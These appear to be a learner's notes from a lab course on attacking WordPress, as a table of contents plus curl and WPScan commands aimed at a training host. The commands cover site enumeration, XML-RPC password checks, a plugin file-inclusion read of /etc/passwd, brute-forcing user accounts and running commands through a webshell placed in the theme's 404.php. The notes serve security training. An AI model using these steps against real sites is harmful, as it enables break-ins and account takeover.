- [Intro](#intro)
  - [WordPress Overview](#wordpress-overview)
...
- [WordPress Core Version Enumeration](#wordpress-core-version-enumeration)
      - [WP Version - Source Code](#wp-version---source-code)
      - [WP Version - CSS](#wp-version---css)
      - [WP Version - JS](#wp-version---js)
- [Plugins and Themes Enumeration](#plugins-and-themes-enumeration)
      - [Plugins](#plugins)
      - [Themes](#themes)
...
- [Login](#login)
      ...
      - [Invalid Credentials - 403 Forbidden](#invalid-credentials---403-forbidden)
- [WPScan Overview](#wpscan-overview)
  - [Using WPScan](#using-wpscan)
- [WPScan Enumeration](#wpscan-enumeration)
  - [Enumerating a Website with WPScan](#enumerating-a-website-with-wpscan)
      - [WPScan Enumeration](#wpscan-enumeration-1)
- [Exploiting a Vulnerable Plugin](#exploiting-a-vulnerable-plugin)
  - [Leveraging WPScan Results](#leveraging-wpscan-results)
      - [LFI using Browser](#lfi-using-browser)
      - [LFI using cURL](#lfi-using-curl)
- [Attacking WordPress Users](#attacking-wordpress-users)
  - [WordPress User Bruteforce](#wordpress-user-bruteforce)
      - [WPscan - XMLRPC](#wpscan---xmlrpc)
- [Remote Code Execution (RCE) via the Theme Editor](#remote-code-execution-rce-via-the-theme-editor)
  - [Attacking the WordPress Backend](#attacking-the-wordpress-backend)
      - [Theme Editor](#theme-editor)
      - [Selecting Theme](#selecting-theme)
      - [Twenty Seventeen Theme - 404.php](#twenty-seventeen-theme---404php)
      - [RCE](#rce)
- [Attacking WordPress with Metasploit](#attacking-wordpress-with-metasploit)
  - [Automating WordPress Exploitation](#automating-wordpress-exploitation)
      - [Starting Metasploit Framework](#starting-metasploit-framework)
...
```bash
Miituberss@htb[/htb]$ tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
...
```bash
Miituberss@htb[/htb]$ tree -L 1 /var/www/html/wp-content
.
├── index.php
├── plugins
└── themes
...
```bash
Miituberss@htb[/htb]$ tree -L 1 /var/www/html/wp-includes
.
├── <SNIP>
├── theme.php
├── update.php
...
```bash
Miituberss@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
...
```bash
Miituberss@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
...
```bash
Miituberss@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
...
```bash
Miituberss@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin
...
```bash
Miituberss@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
...
```bash
Miituberss@htb[/htb]$ curl -s -I http://blog.inlanefreight.com/?author=1
...
```bash
Miituberss@htb[/htb]$ curl -s -I http://blog.inlanefreight.com/?author=100
...
```bash
Miituberss@htb[/htb]$ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
...
```bash
Miituberss@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
...
```bash
Miituberss@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
...
```bash
Miituberss@htb[/htb]$ gem install wpscan
```
...
```bash
Miituberss@htb[/htb]$ wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
...
```bash
Miituberss@htb[/htb]$ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
...
```bash
Miituberss@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
...
```bash
Miituberss@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
